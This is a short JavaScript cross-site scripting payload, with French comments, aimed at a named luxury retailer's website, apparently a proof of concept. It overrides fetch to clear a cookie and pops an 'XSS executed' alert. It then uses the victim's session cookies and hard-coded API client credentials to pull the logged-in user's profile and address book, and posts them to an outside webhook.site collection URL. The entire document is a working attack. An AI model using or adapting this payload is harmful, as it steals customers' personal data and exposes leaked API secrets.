// Sauvegarde la version originale de fetch
const originalFetch = window.fetch;

// RedÃ©finit fetch pour supprimer le cookie avant chaque appel
window.fetch = function(...args) {
    document.cookie = "currentURL=; expires=Thu, 01 Jan 1970 00:00:00 GMT; domain=.louisvuitton.com; path=/";    
    return originalFetch.apply(this, args);
};

window.stop();

alert("XSS executed");

// Ton script reste identique
fetch('https://api.louisvuitton.com/zht-tw/lvcom-client-eapi/v1/clients/addressbook?locale=fra-fr', {
  credentials: 'include',
  headers: {
    'Client_id': '607e3016889f431fb8020693311016c9',
    'Client_secret': '60bbcdcD722D411B88cBb72C8246a22F'
  }
})
  .then(response => response.json())
  .then(addressbookData => {
    return fetch('https://api.louisvuitton.com/zht-tw/lvcom-client-eapi/v1/clients/profile?locale=eng-e1', {
      credentials: 'include',
      headers: {
        'Client_id': '607e3016889f431fb8020693311016c9',
        'Client_secret': '60bbcdcD722D411B88cBb72C8246a22F'
      }
    })
    .then(response => response.json())
    .then(profileData => {
      const combinedData = {
        profile: profileData,
        addressbook: addressbookData
      };

      return fetch('https://webhook.site/989da46f-43c6-4e2a-8771-993f5b14dec6', {
        method: 'POST',
        body: JSON.stringify(combinedData),
        headers: {
          'Content-Type': 'application/json'
        }
      });
    });
  });
